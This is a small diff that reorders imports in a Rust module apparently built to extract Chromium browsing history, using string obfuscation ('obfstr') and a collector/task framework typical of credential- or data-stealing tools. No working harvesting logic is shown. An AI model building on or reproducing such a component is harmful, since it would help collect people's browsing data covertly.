@@ -1,17 +1,16 @@
 use crate::alloc::borrow::ToOwned;
 use crate::chromium::BrowserData;
 use crate::{
-    read_and_collect_unique_records, to_string_and_write_all, ExtractExt, History,
-    SqliteDatabase,
+    ExtractExt, History, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all,
 };
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use derive_new::new;
+use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::FileSystem;
 use obfstr::obfstr as s;
-use tasks::{parent_name, Task};
+use tasks::{Task, parent_name};
 
 const URLS_URL: usize = 1;
 const URLS_TITLE: usize = 2;
